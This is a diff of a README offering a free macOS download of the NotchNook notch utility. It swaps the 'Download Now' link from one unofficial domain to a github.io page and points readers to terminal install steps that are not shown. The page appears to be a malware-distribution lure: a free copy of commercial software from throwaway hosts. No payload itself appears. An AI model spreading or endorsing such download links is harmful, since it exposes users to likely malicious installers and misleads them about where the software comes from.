@@ -2,7 +2,7 @@
 
 NotchNook is a sleek, lightweight utility designed to enhance your macOS experience by transforming the notch area into a dynamic, customizable workspace. Follow the instructions below to download and install NotchNook for free on your Mac.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://veitzeatz.com/notchnook/download)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://notchnook-for-mac-os.github.io/.github/)
 
 If the download button doesn’t work, follow the step-by-step terminal instructions below for a seamless installation.
 
